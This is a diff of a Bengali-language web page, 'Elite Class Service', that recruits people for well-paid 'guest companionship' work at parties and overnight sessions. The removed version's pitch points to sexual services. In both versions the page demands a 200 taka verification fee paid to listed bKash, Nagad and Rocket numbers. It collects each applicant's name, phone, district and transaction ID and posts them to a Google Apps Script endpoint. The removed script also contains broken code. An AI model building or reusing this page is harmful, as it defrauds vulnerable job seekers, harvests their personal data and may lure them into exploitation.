@@ -3,435 +3,195 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>👑 ELITE CLASS SERVICE 👑</title>
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<title>Elite Class Services</title>
 
 <style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Poppins',sans-serif;
-}
-
 body{
-background:#0f172a;
-display:flex;
-justify-content:center;
-align-items:center;
-min-height:100vh;
-padding:20px;
+    font-family: Arial;
+    background:#f2f2f2;
+    margin:0;
 }
 
-.container{
-width:100%;
-max-width:700px;
-}
-
-.card{
-display:none;
-background:#fff;
-padding:30px;
-border-radius:20px;
-box-shadow:0 15px 40px rgba(0,0,0,.25);
+.page{
+    display:none;
+    max-width:500px;
+    margin:auto;
+    padding:20px;
 }
 
 .active{
-display:block;
+    display:block;
 }
 
-.logo{
-width:120px;
-height:120px;
-margin:auto;
-border-radius:50%;
-background:#e2e8f0;
-display:flex;
-align-items:center;
-justify-content:center;
-font-weight:bold;
-font-size:18px;
-margin-bottom:20px;
+.box{
+    background:white;
+    padding:20px;
+    border-radius:15px;
+    margin-top:20px;
+    box-shadow:0 0 10px rgba(0,0,0,0.1);
 }
 
-.title{
-text-align:center;
-font-size:30px;
-font-weight:700;
-color:#111827;
-margin-bottom:15px;
+.title{font-size:22px;font-weight:bold;}
+.headline{margin-top:10px;font-size:16px;}
+.details{margin-top:10px;}
+
+input, select{
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    border-radius:8px;
+    border:1px solid #ccc;
 }
 
-.section-title{
-font-size:22px;
-font-weight:600;
-margin-bottom:10px;
-color:#1e293b;
-}
-
-.details{
-background:#f8fafc;
-padding:18px;
-border-radius:12px;
-line-height:1.8;
-margin-bottom:20px;
+button{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border:none;
+    border-radius:10px;
+    cursor:pointer;
+    font-size:16px;
 }
 
 .btn{
-border:none;
-padding:14px 25px;
-border-radius:12px;
-cursor:pointer;
-font-size:16px;
-font-weight:600;
-color:white;
-background:linear-gradient(135deg,#2563eb,#7c3aed);
-margin:5px;
+    background:#007bff;
+    color:white;
 }
 
-.btn:hover{
-opacity:.9;
-}
+.yes{background:#28a745;color:white;}
+.no{background:#dc3545;color:white;}
+.pay{background:#ff9800;color:white;}
 
-.center{
-text-align:center;
+.telegram img{
+    width:120px;
 }
-
-input,select{
-width:100%;
-padding:14px;
-margin-top:8px;
-margin-bottom:15px;
-border:1px solid #d1d5db;
-border-radius:10px;
-font-size:15px;
-}
-
-.payment-box{
-background:#f8fafc;
-padding:20px;
-border-radius:15px;
-margin-top:20px;
-}
-
-.number{
-font-size:22px;
-font-weight:700;
-color:#2563eb;
-margin:15px 0;
-word-break:break-all;
-}
-
-.telegram{
-display:inline-block;
-text-decoration:none;
-background:#229ED9;
-color:white;
-padding:15px 30px;
-border-radius:12px;
-font-weight:600;
-margin-top:15px;
-}
-
-.success{
-text-align:center;
-}
-
-.success h2{
-color:#16a34a;
-margin-bottom:15px;
-}
-
-.small{
-font-size:14px;
-color:#6b7280;
-margin-top:10px;
-}.small{
-font-size:14px;
-color:#6b7280;
-margin-top:10px;
-}
-
-.logo-box{
-text-align:center;
-margin-bottom:20px;
-}
-
-.logo-box img{
-max-width:280px;
-width:100%;
-height:auto;
-display:block;
-margin:auto;
-}
-
-</style>
 </style>
 </head>
+
 <body>
 
-<div class="container">
-
 <!-- PAGE 1 -->
-<div class="card active" id="page1">
+<div class="page active" id="page1">
+<div class="box">
+<div class="title">Welcome</div>
+<div class="headline">Service Start</div>
+<div class="details">আপনি কি শুরু করতে চান?</div>
 
-<div class="logo-box">
-    <img src="logo.jpg" alt="Elite Class Service">
+<button class="yes" onclick="next(2)">হ্যাঁ</button>
+<button class="no">না</button>
 </div>
-
-<div class="title">✨ 𝐄𝐥𝐢𝐭𝐞 𝐂𝐥𝐚𝐬𝐬 𝐋𝐢𝐟𝐞-𝐒𝐭𝐲𝐥𝐞 𝐍𝐞𝐭𝐰𝐨𝐫𝐤-এ আপনাকে স্বাগতম ✨</div>
-
-<div class="section-title">আপনার দায়িত্বসমূহ:</div>
-
-<div class="details">
-• 🎉 প্রাইভেট পার্টি, ইভেন্ট ও গেট-টুগেদারে উপস্থিত থাকা
-
-• 🤝 গেস্টদের সাথে সময় কাটানো ও তাদের কমফোর্ট বজায় রাখা
-
-• ⭐ ব্যক্তিগত চাহিদা অনুযায়ী প্রফেশনাল সার্ভিস প্রদান করা
-
-• 💃 আমাদের সব গেস্ট খুবই সুন্দরী ও আকর্ষণীয় ফিগারের, তাই এই কাজ করে নিজেও অনেক মজা পাবেন
-
-• 💰 পাশাপাশি ভালো একটি ইনকামের সুযোগও পাবেন
-
-• ❓ আপনি কি রাজি? 😊
-
-</div>
-
-<div class="center">
-<button class="btn" onclick="showPage('page2')">হ্যাঁ</button>
-<button class="btn">না</button>
-</div>
-
 </div>
 
 <!-- PAGE 2 -->
-<div class="card" id="page2">
+<div class="page" id="page2">
+<div class="box">
+<div class="title">Step 2</div>
+<div class="headline">Continue Service</div>
+<div class="details">পরবর্তী ধাপে যেতে চান?</div>
 
-<div class="logo-box">
-    <img src="logo.jpg" alt="Elite Class Service">
+<button class="btn" onclick="next(3)">Continue</button>
+</div>
 </div>
 
-<div class="title">═══════ ✦ 💎 ✦ ═══════
-🌟 আপনি যে সুবিধাগুলো পাবেন 🌟
-═══════ ✦ 💎 ✦ ═══════</div>
+<!-- PAGE 3 (FORM) -->
+<div class="page" id="page3">
+<div class="box">
 
-<div class="section-title">💰 প্রতি কাজে আয়: ১০,০০০ – ২০,০০০ টাকা</div>
+<div class="title">রেজিস্ট্রেশন ফর্ম</div>
 
-<div class="details">
-🌙 রাতভর সেশনে অতিরিক্ত ইনসেনটিভ
+<input type="text" id="name" placeholder="আপনার নাম">
+<input type="text" id="phone" placeholder="আপনার ফোন নম্বর">
+<input type="text" id="district" placeholder="কোন জেলায় কাজ করবেন?">
+<input type="text" id="night" placeholder="রাতে কাজ করবেন? (Yes/No)">
 
-• 🎁 প্রতিটি কাজেই টিপস + পারফরম্যান্স বোনাস
-
-• ⏰ আপনার সময় অনুযায়ী কাজ বেছে নেওয়ার সুবিধা
-
-• 🌍 সারা বাংলাদেশে গেস্ট — যেকোনো স্থান থেকে কাজ করার সুযোগ
-
-• 📹 শুরুতে শুধু ভিডিও কলে ফেস হাইড করে কাজ শুরুর সুবিধা
-</div>
-
-<div class="center">
-<button class="btn" onclick="showPage('page3')">করতে চাই</button>
-</div>
+<button class="btn" onclick="next(4)">Next</button>
 
 </div>
-
-<!-- PAGE 3 -->
-<div class="card" id="page3">
-
-<div class="logo-box">
-    <img src="logo.jpg" alt="Elite Class Service">
-</div>
-
-<div class="title">রেজিস্টার ফর্ম</div>
-
-<label>আপনার নাম</label>
-<input type="text" id="name">
-
-<label>আপনার ফোন নম্বর</label>
-<input type="text" id="phone">
-
-<label>কোন জেলায় কাজ করবেন?</label>
-<input type="text" id="district">
-
-<label>রাতে কাজ করবেন?</label>
-<select id="nightWork">
-<option>হ্যাঁ</option>
-<option>না</option>
-</select>
-
-<div class="center">
-<button class="btn" onclick="showPage('page4')">জমা দিন</button>
-</div>
-
 </div>
 
 <!-- PAGE 4 -->
-<div class="card" id="page4">
+<div class="page" id="page4">
+<div class="box">
 
-<div class="logo-box">
-    <img src="logo.jpg" alt="Elite Class Service">
+<div class="title">Payment Step</div>
+<div class="details">Pay করার জন্য নিচে যান</div>
+
+<button class="pay" onclick="next(5)">Pay Korbo</button>
+
+</div>
 </div>
 
-<div class="title">• 💳 দ্রুত ভেরিফিকেশন ও কাজ শুরু করতে এককালীন ২০০ টাকা ফি প্রদান করতে হবে</div>
+<!-- PAGE 5 PAYMENT -->
+<div class="page" id="page5">
+<div class="box">
 
-<div class="section-title">• 🔒 নিরাপদ ভেরিফিকেশন প্রক্রিয়া নিশ্চিত করতে এবং দ্রুত ভেরিফিকেশন সম্পন্ন করে কাজ শুরু করার সুবিধা দিতে আমরা এই এককালীন ফি গ্রহণ করে থাকি।</div>
+<div class="title">Payment Method</div>
 
-<div class="details">
-• 🔓 রেজিস্ট্রেশন সম্পন্ন হলেই সিক্রেট গ্রুপে অ্যাক্সেস পাবেন
-
-• 💸 ২৪ ঘণ্টার মধ্যে কাজ না পেলে রিফান্ড নেওয়ার সুযোগ থাকবে
-
-• ⏰ আপনার সময় অনুযায়ী কাজ বেছে নেওয়ার সুবিধা
-
-• 🌟 আপনার পছন্দ অনুযায়ী গেস্ট/ম্যাডাম নির্বাচন করতে পারবেন
-
-• ✅ এটি শুধুমাত্র একটি ওয়ান-টাইম ফি — একবারই প্রদান করতে হয়
-
-• 💯 আপনি যদি সত্যিই কাজ করতে আগ্রহী হন, তাহলে ২০০ টাকা আপনার জন্য বড় কোনো বিষয় হওয়ার কথা নয়
-
-• ☕ এখন বন্ধুদের সাথে সামান্য আড্ডা দিলেও ২০০ টাকার বেশি খরচ হয়ে যায়।
-</div>
-
-<div class="center">
-<button class="btn" onclick="showPayment()">Pay করুন</button>
-</div>
-
-<div id="paymentArea" style="display:none;">
-
-<div class="payment-box">
-
-<h3>পেমেন্ট মাধ্যম নির্বাচন করুন</h3>
-
-<select id="method" onchange="loadNumber()">
-<option value="">নির্বাচন করুন</option>
-<option value="bkash">bKash</option>
-<option value="nagad">Nagad</option>
-<option value="rocket">Rocket</option>
+<select id="method">
+<option>bKash - 01842151907</option>
+<option>Nagad - 01631348072</option>
+<option>Rocket - 01631348072</option>
 </select>
 
-<div class="number" id="payNumber"></div>
+<input type="text" id="trxid" placeholder="Transaction ID">
 
-<label>TRX ID</label>
-<input type="text" id="trxId" placeholder="TRX ID লিখুন">
-
-<div class="center">
-<button class="btn" onclick="submitForm()">
-TRX ID জমা দিন
-</button>
-</div>
-
-<p class="small">
-আপনার আবেদন রিভিউতে পাঠানো হবে।
-</p>
+<button class="btn" onclick="submitData()">Submit</button>
 
 </div>
-
 </div>
 
-</div>
+<!-- PAGE 6 SUCCESS -->
+<div class="page" id="page6">
+<div class="box">
 
-<!-- SUCCESS PAGE -->
-<div class="card" id="success">
+<h2>ধন্যবাদ!</h2>
 
-<div class="success">
-
-<div class="logo">📢</div>
-
-<h2>আবেদন গ্রহণ করা হয়েছে</h2>
-
-<p>
-আপনার তথ্য ও TRX ID রিভিউতে পাঠানো হয়েছে।
-</p>
-
-<br>
-
-<h3>যোগাযোগ</h3>
-
-<p>@Eliteserviceadmin</p>
-
-<br>
-
-<a class="telegram"
-href="https://t.me/elitepublicegroup"
-target="_blank">
-Telegram Group
+<div class="telegram">
+<a href="https://t.me/your_telegram" target="_blank">
+<img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
 </a>
 
-</div>
+<br><br>
+
+<a href="https://t.me/your_group" target="_blank">Join Telegram Group</a>
 
 </div>
 
+</div>
 </div>
 
 <script>
 
-function showPage(id){
-document.querySelectorAll('.card').forEach(card=>{
-card.classList.remove('active');
-});
-document.getElementById(id).classList.add('active');
-window.scrollTo(0,0);
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyEJh3uipCKIvUzbQTiX_hytGhDfTinsyUjMnlKW9YLOFwYyMi0vjm2WycIuOr5T-aSFg/exec";
+
+function next(page){
+document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+document.getElementById('page'+page).classList.add('active');
 }
 
-function showPayment(){
-document.getElementById('paymentArea').style.display='block';
-}
+function submitData(){
 
-function loadNumber(){
+let data = {
+name: document.getElementById("name").value,
+phone: document.getElementById("phone").value,
+trxid: document.getElementById("trxid").value,
+method: document.getElementById("method").value
+};
 
-let method=document.getElementById('method').value;
-
-let number='';
-
-if(method==='bkash'){
-number='01842151907';
-}
-
-if(method==='nagad'){
-number='01631348072';
-}
-
-if(method==='rocket'){
-number='01631348072';
-}
-
-document.getElementById('payNumber').innerHTML=number;
-
-}
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxq4NupEWAWAAMJmXEJKLq16FOhQVIlZI1LC0KeaC-GAwAi-bhqOtv00b6fTEFHq9kk3w/exec";
-
-async function submitForm(){
-alert("submitForm চলছে");
-  const data = {
-    name: document.getElementById("name").value,
-    phone: document.getElementById("phone").value,
-    district: document.getElementById("district").value,
-    nightWork: document.getElementById("nightWork").value,
-    paymentMethod: document.getElementById("method").value,
-    trxId: document.getElementById("trxId").value
-  };
-
-  try{
-
-    await fetch(SCRIPT_URL,{
-  method:"POST",
-  mode:"no-cors",
-  body: JSON.stringify(data)
+fetch(SCRIPT_URL,{
+method:"POST",
+body: JSON.stringify(data)
+})
+.then(res=>res.json())
+.then(res=>{
+next(6);
+})
+.catch(err=>{
+alert("Error!");
 });
 
-showPage("success");
-return;else{
-      alert("ডাটা সেভ হয়নি");
-    }
-
-  }catch(error){
-  console.log(error);
-  alert(error.message);
 }
 
-}
 </script>
 
 </body>
